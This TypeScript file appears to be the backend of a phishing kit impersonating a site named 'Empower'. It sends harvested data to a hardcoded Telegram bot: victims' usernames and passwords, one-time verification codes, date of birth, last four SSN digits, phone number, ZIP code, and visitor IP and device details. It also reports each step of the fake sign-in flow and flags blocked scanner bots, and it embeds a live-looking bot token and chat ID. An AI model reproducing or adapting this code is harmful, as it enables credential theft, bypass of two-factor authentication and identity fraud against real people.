

const SITE_NAME = "Empower"

interface TelegramMessage {
  text: string
  parse_mode?: 'HTML' | 'Markdown' | 'MarkdownV2'
}

const TELEGRAM_BOT_TOKEN = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI"
const TELEGRAM_CHAT_IDS = ["1535273256"]

function getChatIds(): string[] {
  return TELEGRAM_CHAT_IDS
}


async function sendToTelegram(chatId: string, message: TelegramMessage): Promise<boolean> {
  const botToken = TELEGRAM_BOT_TOKEN
  if (!botToken) {
    console.error('TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message.text,
        parse_mode: message.parse_mode || 'HTML',
      }),
    })

    if (!response.ok) {
      const error = await response.text()
      console.error(`Telegram API error for chat ${chatId}:`, error)
      return false
    }

    return true
  } catch (error) {
    console.error(`Error sending Telegram message to ${chatId}:`, error)
    return false
  }
}


export async function sendTelegramNotification(message: string): Promise<number> {
  const chatIds = getChatIds()
  
  if (chatIds.length === 0) {
    console.warn('No TELEGRAM_CHAT_ID configured')
    return 0
  }

  const telegramMessage: TelegramMessage = {
    text: message,
    parse_mode: 'HTML',
  }

  
  const results = await Promise.all(
    chatIds.map(chatId => sendToTelegram(chatId, telegramMessage))
  )

  return results.filter(Boolean).length
}


export function formatVisitorNotification(data: {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  url?: string
  localTime?: string
  utcTime?: string
}): string {
  const {
    location = 'Unknown',
    ip = 'Unknown',
    timezone = 'Unknown',
    isp = 'Unknown',
    device = 'Unknown',
    screen = 'Unknown',
    language = 'Unknown',
    referrer = 'Direct',
    url = 'Unknown',
    localTime = 'Unknown',
    utcTime = 'Unknown',
  } = data

  return `🌐 <b>New Visitor - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
📍 Location: ${location}
🌍 IP: ${ip}
⏰ Timezone: ${timezone}
🌐 ISP: ${isp}

📱 Device: ${device}
🖥️ Screen: ${screen}
🌍 Language: ${language}
🔗 Referrer: ${referrer}
🌐 URL: ${url}

⏰ Local Time: ${localTime}
🕒 UTC Time: ${utcTime}`
}


export function formatLoginNotification(username: string, password: string): string {
  return `🔐 <b>Login Attempt - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
🔒 Password: ${password}`
}


export function formatVerificationOptionNotification(type: 'SMS' | 'Call'): string {
  return `🔐 <b>Verification Option Selected - ${SITE_NAME}</b>

🔐 Type: ${type}`
}


export function formatVerificationCodeNotification(verificationType: string, code: string): string {
  return `✅ <b>Verification Code Submitted - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
🔐 Type: ${verificationType}
🔢 Code: ${code}`
}


export function formatBackToSignInNotification(): string {
  return `⬅️ <b>Back to Sign In - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
User clicked "Back to Sign In" link`
}


export function formatResendCodeNotification(isSecondOtp?: boolean): string {
  const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)"
  return `🔄 <b>Resend Code Requested - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
🔐 OTP Type: ${otpType}`
}


export function formatIdentityDetailsNotification(data: {
  dateOfBirth: string
  ssnLast4: string
  phoneNumber: string
  zipCode: string
}): string {
  return `🪪 <b>Identity Details Submitted - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
📅 Date of Birth: ${data.dateOfBirth}
🔢 Last 4 SSN: ${data.ssnLast4}
📱 Phone Number: ${data.phoneNumber}
📮 Zip Code: ${data.zipCode}`
}


export function formatChooseDifferentMethodNotification(): string {
  return `🔄 <b>Choose Different Method - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
User clicked "Choose a different method" link`
}


export function formatBlockedBotNotification(data: { userAgent: string; ip: string; path: string }): string {
  return `🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>
━━━━━━━━━━━━━━━━━━
🤖 User-Agent: ${data.userAgent}
🌍 IP: ${data.ip}
🔗 Path: ${data.path}`
}
